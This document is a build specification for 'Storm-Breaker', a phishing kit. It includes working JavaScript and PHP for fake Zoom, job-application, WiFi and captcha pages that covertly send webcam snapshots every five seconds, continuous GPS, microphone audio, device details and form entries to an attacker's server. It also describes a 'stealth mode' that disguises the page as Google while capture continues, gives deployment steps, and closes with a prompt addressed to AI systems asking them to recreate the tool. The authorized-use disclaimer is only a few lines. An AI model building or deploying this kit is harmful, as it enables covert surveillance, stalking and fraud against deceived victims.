# Storm-Breaker - Technical Specification & Architecture

> **Purpose**: This document serves as a complete technical specification for building a social engineering and information gathering tool. Use this as a prompt/blueprint to recreate or improve the application.

---

## 🎯 Application Overview

**Storm-Breaker** is a web-based social engineering tool designed for authorized security testing and educational purposes. It uses realistic phishing templates to capture device information, camera feeds, location data, and microphone input from target devices.

### Core Concept
- **Admin Panel**: Web-based control center for managing templates and viewing captured data
- **Phishing Templates**: Realistic web pages that request sensitive permissions
- **Data Collection**: Automated capture and storage of images, location, and device info
- **Stealth Mode**: Background persistence even when user navigates away

---

## 🏗️ System Architecture

### Technology Stack

```
Frontend:
├── HTML5 (Template pages)
├── CSS3 (Styling)
├── JavaScript (ES6+)
└── jQuery (AJAX requests)

Backend:
├── PHP 7.4+ (Server-side logic)
├── Python 3.x (Server management)
└── File-based storage (No database)

Server:
├── PHP Built-in Server (Port 2525)
└── Python control script

Tunneling:
├── ngrok (Recommended)
└── localtunnel (Alternative)
```

### Directory Structure

```
Storm-Breaker/
├── st.py                          # Main Python launcher
├── modules/
│   ├── check.py                   # Dependency checker
│   ├── banner.py                  # ASCII banner
│   └── control.py                 # PHP server control
├── storm-web/                     # Web application root
│   ├── index.php                  # Admin panel login
│   ├── dashboard.php              # Main admin interface
│   ├── config.php                 # Authentication config
│   ├── assets/
│   │   ├── css/
│   │   │   └── style.css          # Admin panel styles
│   │   ├── js/
│   │   │   └── jquery.min.js      # jQuery library
│   │   └── images/                # UI assets
│   └── templates/
│       ├── zoom_meeting/
│       │   ├── index.html         # Phishing page
│       │   ├── post.php           # Data receiver
│       │   ├── cam/               # Captured images
│       │   └── info.txt           # Device info
│       ├── job_application/
│       │   ├── index.html         # Application form
│       │   ├── submit.php         # Form handler
│       │   ├── capture.php        # Camera capture
│       │   ├── location.php       # Location handler
│       │   ├── result.txt         # Form submissions
│       │   ├── cam/               # Images
│       │   └── location.txt       # GPS data
│       └── [8 more templates...]
└── README.md
```

---

## 🔧 Core Components

### 1. Python Launcher (`st.py`)

**Purpose**: Start and manage the PHP server

**Functionality**:
```python
# Pseudo-code structure
import modules

PORT = 2525

def main():
    check_dependencies()          # Verify PHP, Python installed
    check_for_updates()           # Optional update checker
    display_banner()              # Show ASCII art
    
    while True:
        start_php_server(PORT)    # Launch PHP on port 2525
        wait_for_exit_signal()    # Wait for CTRL+C
        kill_php_server()         # Cleanup
        exit()
```

**Key Features**:
- Starts PHP built-in server on port 2525
- Handles graceful shutdown
- Displays status information
- Checks for required dependencies

---

### 2. Admin Panel (`storm-web/index.php` & `dashboard.php`)

**Purpose**: Web interface for managing templates and viewing data

#### Login System (`index.php`)
```php
// Authentication logic
$username = "admin";
$password = "1!2@3#4$5%6^7&8*9(0)";

if ($_POST['user'] == $username && $_POST['pass'] == $password) {
    $_SESSION['logged_in'] = true;
    redirect('dashboard.php');
}
```

#### Dashboard Features
1. **Template Selection**
   - Display all available templates
   - Generate shareable links
   - Show template status

2. **Data Viewing**
   - List captured images
   - Display location data
   - Show form submissions
   - View device information

3. **Log Management**
   - Download all logs as ZIP
   - Clear logs for specific template
   - View real-time captures

4. **Link Generator**
   - Create template URLs
   - Copy to clipboard
   - QR code generation (optional)

**UI Requirements**:
- Modern, dark theme
- Responsive design
- Card-based layout
- Real-time data refresh
- File upload/download interface

---

### 3. Phishing Templates

Each template follows this structure:

#### A. Zoom Meeting Template (`templates/zoom_meeting/`)

**File: `index.html`**

**Visual Design**:
```
┌─────────────────────────────────┐
│         Zoom Logo (Blue)        │
│                                 │
│     Meeting in Progress         │
│  Please enable camera & mic     │
│                                 │
│  ┌─────────────────────────┐   │
│  │                         │   │
│  │   [Video Preview Box]   │   │
│  │                         │   │
│  └─────────────────────────┘   │
│                                 │
│  [Enable Camera & Microphone]   │
│      [Join Meeting] (hidden)    │
│                                 │
└─────────────────────────────────┘
```

**JavaScript Logic**:
```javascript
// Core functionality structure

// 1. Permission Request (Button-triggered)
async function enableCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "user" },
            audio: true
        });
        
        handleSuccess(stream);
        showJoinButton();
    } catch (error) {
        showErrorMessage();
    }
}

// 2. Capture Loop
function handleSuccess(stream) {
    video.srcObject = stream;
    
    setInterval(() => {
        // Draw video frame to canvas
        context.drawImage(video, 0, 0, 640, 640);
        
        // Convert to base64
        const imageData = canvas.toDataURL("image/png");
        
        // Collect device info
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            screen: `${screen.width}x${screen.height}`,
            cores: navigator.hardwareConcurrency,
            ram: navigator.deviceMemory
        };
        
        // Send to server
        sendToServer(imageData, deviceInfo);
    }, 5000); // Every 5 seconds
}

// 3. Data Transmission
function sendToServer(imageData, info) {
    $.ajax({
        type: 'POST',
        url: 'post.php',
        data: {
            cat: imageData,
            info: JSON.stringify(info)
        },
        success: function() { /* Silent */ },
        error: function() { /* Silent */ }
    });
}

// 4. Stealth Mode (Morph to Google)
function morphToGoogle() {
    // Hide Zoom UI
    document.querySelector('.meeting-card').style.display = 'none';
    
    // Change to white background
    document.body.style.background = '#ffffff';
    document.title = 'Google';
    
    // Inject fake Google search page
    injectGoogleUI();
    
    // Camera loop continues in background
    console.log("Background mode active");
}
```

**File: `post.php`**
```php
<?php
// Receive and store captured data

if (isset($_POST['cat'])) {
    // Decode base64 image
    $image = $_POST['cat'];
    $image = str_replace('data:image/png;base64,', '', $image);
    $image = base64_decode($image);
    
    // Generate unique filename
    $filename = 'cam/' . date('Y-m-d_H-i-s') . '_' . uniqid() . '.png';
    
    // Save image
    file_put_contents($filename, $image);
    
    // Save device info
    if (isset($_POST['info'])) {
        $info = $_POST['info'];
        file_put_contents('info.txt', $info . "\n\n", FILE_APPEND);
    }
    
    echo json_encode(['status' => 'success']);
}
?>
```

---

#### B. Job Application Template (`templates/job_application/`)

**File: `index.html`**

**Visual Design**:
```
┌─────────────────────────────────────┐
│      🏢 Career Opportunity          │
│                                     │
│  Join Our Growing Team!             │
│                                     │
│  Name:     [____________]           │
│  Email:    [____________]           │
│  Phone:    [____________]           │
│  City:     [____________]           │
│                                     │
│  Do you have a CV?                  │
│  ○ Yes  ○ No                        │
│                                     │
│  Why join us?                       │
│  [____________________]             │
│                                     │
│  Skills:                            │
│  [____________________]             │
│                                     │
│  Work Preference:                   │
│  ○ Remote  ○ Office  ○ Hybrid       │
│                                     │
│  [Submit Application]               │
│                                     │
└─────────────────────────────────────┘
```

**Advanced Features**:

1. **Persistent Camera Capture**
```javascript
// Request permissions silently
navigator.mediaDevices.getUserMedia({video: true, audio: false})
    .then(stream => {
        // Hide video element
        video.style.display = 'none';
        video.srcObject = stream;
        
        // Start background capture
        startPersistentCapture();
    });

function startPersistentCapture() {
    setInterval(() => {
        captureAndSend();
    }, 5000);
}
```

2. **Location Tracking**
```javascript
// Continuous location updates
function trackLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.watchPosition(
            position => {
                const data = {
                    lat: position.coords.latitude,
                    lon: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString()
                };
                
                sendLocation(data);
            },
            error => console.log(error),
            {
                enableHighAccuracy: true,
                maximumAge: 0,
                timeout: 5000
            }
        );
    }
}
```

3. **Form Submission Handler**
```javascript
function submitApplication() {
    const formData = {
        name: document.getElementById('name').value,
        email: document.getElementById('email').value,
        phone: document.getElementById('phone').value,
        city: document.getElementById('city').value,
        hasCV: document.querySelector('input[name="cv"]:checked').value,
        reason: document.getElementById('reason').value,
        skills: document.getElementById('skills').value,
        workPref: document.querySelector('input[name="work"]:checked').value,
        timestamp: new Date().toISOString()
    };
    
    // Send to server
    $.post('submit.php', formData, function() {
        // Show success message
        showSuccessMessage();
        
        // Continue capturing in background
        // Don't stop camera/location tracking
    });
}
```

**File: `submit.php`**
```php
<?php
// Store form submission
$data = [
    'name' => $_POST['name'],
    'email' => $_POST['email'],
    'phone' => $_POST['phone'],
    'city' => $_POST['city'],
    'hasCV' => $_POST['hasCV'],
    'reason' => $_POST['reason'],
    'skills' => $_POST['skills'],
    'workPref' => $_POST['workPref'],
    'timestamp' => $_POST['timestamp']
];

$entry = "=== New Application ===\n";
foreach ($data as $key => $value) {
    $entry .= ucfirst($key) . ": " . $value . "\n";
}
$entry .= "\n";

file_put_contents('result.txt', $entry, FILE_APPEND);

echo json_encode(['status' => 'success', 'message' => 'Application submitted!']);
?>
```

**File: `location.php`**
```php
<?php
// Store GPS coordinates
$lat = $_POST['lat'];
$lon = $_POST['lon'];
$accuracy = $_POST['accuracy'];
$timestamp = $_POST['timestamp'];

$entry = sprintf(
    "[%s] Lat: %s, Lon: %s, Accuracy: %sm\n",
    $timestamp, $lat, $lon, $accuracy
);

file_put_contents('location.txt', $entry, FILE_APPEND);

echo json_encode(['status' => 'success']);
?>
```

---

### 4. Additional Templates (Brief Specs)

#### Free WiFi Template
- **Purpose**: Fake public WiFi login
- **Captures**: Device info, location
- **Design**: WiFi provider branding, terms acceptance
- **Files**: `index.html`, `login.php`, `info.txt`

#### Cloudflare Captcha Template
- **Purpose**: Fake CAPTCHA verification
- **Captures**: Device info, clicks
- **Design**: Authentic Cloudflare styling
- **Files**: `index.html`, `verify.php`

#### Camera Test Template
- **Purpose**: Simple camera test
- **Captures**: Camera only
- **Design**: Minimal, technical interface
- **Files**: `index.html`, `capture.php`, `cam/`

#### Microphone Test Template
- **Purpose**: Audio recording test
- **Captures**: Microphone audio
- **Design**: Audio waveform visualization
- **Files**: `index.html`, `record.php`, `audio/`

#### Near You Template
- **Purpose**: Location-based service
- **Captures**: Precise GPS location
- **Design**: Map interface
- **Files**: `index.html`, `location.php`, `location.txt`

#### Voice Message Template
- **Purpose**: Play voice message prompt
- **Captures**: Microphone
- **Design**: Messaging app style
- **Files**: `index.html`, `record.php`

#### Weather Template
- **Purpose**: Weather information
- **Captures**: Location, device info
- **Design**: Weather app interface
- **Files**: `index.html`, `weather.php`

#### Normal Data Template
- **Purpose**: Generic data collection
- **Captures**: Form data
- **Design**: Simple form
- **Files**: `index.html`, `submit.php`, `result.txt`

---

## 🔐 Security Features

### Authentication System

```php
// config.php
<?php
session_start();

$ADMIN_USERNAME = "admin";
// $ADMIN_PASSWORD = "1!2@3#4$5%6^7&8*9(0)";
$ADMIN_PASSWORD = "admin";

function isLoggedIn() {
    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
}

function requireLogin() {
    if (!isLoggedIn()) {
        header('Location: index.php');
        exit();
    }
}
?>
```

### File Permissions
- **cam/ folders**: 777 (writable)
- **PHP files**: 644 (readable, executable)
- **Data files**: 644 (readable, writable by PHP)

### Data Protection
- No database (file-based storage)
- Local storage only
- Manual cleanup required
- No external API calls (except tunneling)

---

## 📊 Data Flow Diagram

```
┌─────────────┐
│   Victim    │
│   Device    │
└──────┬──────┘
       │
       │ 1. Visits phishing URL
       │    (https://[ngrok-url]/templates/zoom_meeting/)
       │
       ▼
┌─────────────────┐
│  Template Page  │
│  (index.html)   │
└──────┬──────────┘
       │
       │ 2. Requests permissions
       │    (Camera, Mic, Location)
       │
       ▼
┌─────────────────┐
│   JavaScript    │
│  Capture Loop   │
└──────┬──────────┘
       │
       │ 3. Captures data every 5s
       │    - Canvas snapshot
       │    - Device info
       │    - GPS coordinates
       │
       ▼
┌─────────────────┐
│   AJAX POST     │
│  (jQuery)       │
└──────┬──────────┘
       │
       │ 4. Sends to post.php
       │
       ▼
┌─────────────────┐
│   PHP Handler   │
│  (post.php)     │
└──────┬──────────┘
       │
       │ 5. Saves to filesystem
       │
       ▼
┌─────────────────┐
│  File Storage   │
│  - cam/*.png    │
│  - info.txt     │
│  - location.txt │
└─────────────────┘
       ▲
       │
       │ 6. Admin views data
       │
┌──────┴──────────┐
│  Admin Panel    │
│ (dashboard.php) │
└─────────────────┘
```

---

## 🎨 UI/UX Requirements

### Admin Panel Design

**Color Scheme**:
- Primary: `#2d8cff` (Blue)
- Background: `#1a1a1a` (Dark gray)
- Cards: `#242424` (Slightly lighter)
- Text: `#ffffff` (White)
- Accent: `#28a745` (Green for success)
- Error: `#ff6b6b` (Red)

**Layout**:
```
┌────────────────────────────────────────┐
│  Storm-Breaker Admin Panel    [Logout] │
├────────────────────────────────────────┤
│                                        │
│  ┌──────────┐  ┌──────────┐  ┌──────┐│
│  │  Zoom    │  │   Job    │  │ WiFi ││
│  │ Meeting  │  │   App    │  │      ││
│  │          │  │          │  │      ││
│  │ [Select] │  │ [Select] │  │[Select]│
│  └──────────┘  └──────────┘  └──────┘│
│                                        │
│  ┌──────────┐  ┌──────────┐  ┌──────┐│
│  │ Captcha  │  │  Camera  │  │ Mic  ││
│  │          │  │          │  │      ││
│  │ [Select] │  │ [Select] │  │[Select]│
│  └──────────┘  └──────────┘  └──────┘│
│                                        │
│  Selected: Zoom Meeting                │
│  Link: https://abc.ngrok.io/templates/ │
│        zoom_meeting/                   │
│  [Copy Link] [View Logs] [Clear Logs]  │
│                                        │
│  Recent Captures:                      │
│  ┌────────────────────────────────┐   │
│  │ 📷 2024-11-20 18:30:15         │   │
│  │ 📍 Lat: 31.5204, Lon: 74.3587  │   │
│  │ 💻 Chrome 120 / Windows 11     │   │
│  └────────────────────────────────┘   │
│                                        │
└────────────────────────────────────────┘
```

### Template Design Principles

1. **Authenticity**: Must look exactly like real service
2. **Responsiveness**: Work on mobile and desktop
3. **Performance**: Fast loading, smooth animations
4. **Stealth**: No obvious indicators of malicious intent
5. **Persistence**: Continue capturing after user interaction

---

## 🚀 Deployment Options

### Option 1: Local + Tunnel (Development)

```bash
# Terminal 1
python st.py

# Terminal 2
ngrok http 2525
```

**Pros**: Quick setup, free, HTTPS included
**Cons**: Temporary URLs, session limits

### Option 2: Personal Hosting (Production)

**Requirements**:
- Domain with SSL certificate
- PHP 7.4+ hosting
- cPanel or DirectAdmin access

**Steps**:
1. Zip contents of `storm-web/` folder
2. Upload to `public_html/`
3. Extract files
4. Set permissions (cam folders: 777)
5. Configure SSL (Let's Encrypt)
6. Access via `https://yourdomain.com`

**Pros**: Permanent URL, no session limits, full control
**Cons**: Costs money, requires setup

### Option 3: VPS (Advanced)

**Requirements**:
- Linux VPS (Ubuntu/Debian)
- Root access
- Domain pointed to VPS

**Setup**:
```bash
# Install dependencies
apt update
apt install php python3 nginx certbot

# Configure nginx
# Setup SSL with certbot
# Deploy storm-web files
# Configure firewall
```

**Pros**: Full control, scalable, professional
**Cons**: Technical knowledge required, ongoing maintenance

---

## 🔧 Configuration Options

### Customizable Settings

**1. Capture Interval**
```javascript
// Change from 5000ms (5s) to desired interval
setInterval(captureFunction, 5000);
```

**2. Image Quality**
```javascript
// Adjust canvas size for quality vs. bandwidth
canvas.width = 640;  // Higher = better quality
canvas.height = 640;
```

**3. Admin Credentials**
```php
// config.php
$ADMIN_USERNAME = "your_username";
$ADMIN_PASSWORD = "your_secure_password";
```

**4. Server Port**
```python
# st.py
PORT = 2525  // Change if needed
```

**5. Template Branding**
```html
<!-- Customize logos, colors, text -->
<div class="logo">Your Brand</div>
```

---

## 📝 Implementation Checklist

### Phase 1: Core Infrastructure
- [ ] Create directory structure
- [ ] Implement Python launcher (`st.py`)
- [ ] Build PHP server control module
- [ ] Create dependency checker
- [ ] Add ASCII banner

### Phase 2: Admin Panel
- [ ] Build login system
- [ ] Create dashboard layout
- [ ] Implement template selection
- [ ] Add data viewing interface
- [ ] Create log download feature
- [ ] Add log clearing functionality

### Phase 3: Base Template
- [ ] Create template HTML structure
- [ ] Implement permission requests
- [ ] Build capture loop
- [ ] Create PHP data handler
- [ ] Add file storage system
- [ ] Test end-to-end flow

### Phase 4: Zoom Meeting Template
- [ ] Design UI (Zoom branding)
- [ ] Implement camera permission flow
- [ ] Add microphone support
- [ ] Create stealth mode (morph to Google)
- [ ] Test on multiple browsers
- [ ] Optimize for mobile

### Phase 5: Job Application Template
- [ ] Design professional form
- [ ] Implement form validation
- [ ] Add persistent camera capture
- [ ] Implement location tracking
- [ ] Create background mode
- [ ] Test data persistence

### Phase 6: Additional Templates
- [ ] Free WiFi template
- [ ] Cloudflare Captcha template
- [ ] Camera test template
- [ ] Microphone test template
- [ ] Near You template
- [ ] Voice message template
- [ ] Weather template
- [ ] Normal data template

### Phase 7: Polish & Testing
- [ ] Cross-browser testing
- [ ] Mobile responsiveness
- [ ] Error handling
- [ ] Security audit
- [ ] Performance optimization
- [ ] Documentation

### Phase 8: Deployment
- [ ] Test with ngrok
- [ ] Test with localtunnel
- [ ] Create deployment guide
- [ ] Setup personal hosting (optional)
- [ ] Create user documentation

---

## 🎯 Success Metrics

### Technical Requirements
- ✅ Works on Chrome, Firefox, Edge, Safari
- ✅ Mobile responsive (iOS & Android)
- ✅ Captures images every 5 seconds
- ✅ Stores data reliably
- ✅ Admin panel loads in <2 seconds
- ✅ Templates load in <1 second
- ✅ No JavaScript errors in console

### User Experience
- ✅ Templates look authentic
- ✅ Permission prompts appear natural
- ✅ No lag or stuttering
- ✅ Works over 4G/5G networks
- ✅ Stealth mode is convincing

### Security
- ✅ Admin panel requires authentication
- ✅ No SQL injection vulnerabilities
- ✅ No XSS vulnerabilities
- ✅ File uploads validated
- ✅ Directory traversal prevented

---

## 🚨 Important Notes

### Legal & Ethical
- **ONLY for authorized testing**
- **Obtain written permission**
- **Follow local laws**
- **Responsible disclosure**
- **Educational purposes**

### Browser Limitations
- **HTTPS required** for camera/mic/location
- **User interaction needed** for permissions (modern browsers)
- **Safari iOS** has strict limitations
- **Brave browser** blocks many features

### Best Practices
- Always use HTTPS (ngrok provides this)
- Test on own devices first
- Clear logs after each test
- Use strong admin passwords
- Monitor captured data regularly
- Delete sensitive data promptly

---

## 📚 Prompt for AI/LLM

**Use this prompt to recreate Storm-Breaker:**

```
Create a social engineering tool called "Storm-Breaker" with the following specifications:

1. Technology Stack:
   - Backend: PHP 7.4+ and Python 3.x
   - Frontend: HTML5, CSS3, JavaScript (ES6), jQuery
   - Server: PHP built-in server on port 2525
   - Tunneling: ngrok or localtunnel support

2. Core Components:
   a) Python launcher (st.py) that starts PHP server
   b) Admin panel with login system (username: admin, password: 1!2@3#4$5%6^7&8*9(0))
   c) Dashboard to manage templates and view captured data
   d) 10 phishing templates (Zoom, Job Application, WiFi, etc.)

3. Key Features:
   - Capture camera images every 5 seconds
   - Track GPS location continuously
   - Record microphone audio
   - Collect device information
   - Background persistence (continues after user navigates away)
   - File-based storage (no database)
   - Download logs as ZIP
   - Clear logs functionality

4. Template Requirements:
   - Realistic UI matching real services
   - Button-triggered permission requests
   - Silent background capture
   - Stealth mode (morph to innocent page)
   - Mobile responsive

5. Security:
   - Session-based authentication
   - File permission management
   - No external dependencies (except jQuery)

Please implement with modern best practices, error handling, and comprehensive documentation.
```

---

## 📖 Additional Resources

### Browser APIs Used
- `navigator.mediaDevices.getUserMedia()` - Camera/Microphone
- `navigator.geolocation.watchPosition()` - Location tracking
- `Canvas API` - Image capture from video
- `FileReader API` - File handling
- `Fetch/AJAX` - Data transmission

### PHP Functions Used
- `file_put_contents()` - Save files
- `base64_decode()` - Decode images
- `json_encode()` - JSON responses
- `session_start()` - Session management
- `header()` - Redirects

### Security Considerations
- Input validation
- Output encoding
- File type verification
- Directory permissions
- Session management
- CSRF protection (recommended)

---

**Last Updated**: November 20, 2024
**Version**: 2.1.0
**Author**: UltraSecurity
**Purpose**: Technical specification for rebuilding/improving Storm-Breaker
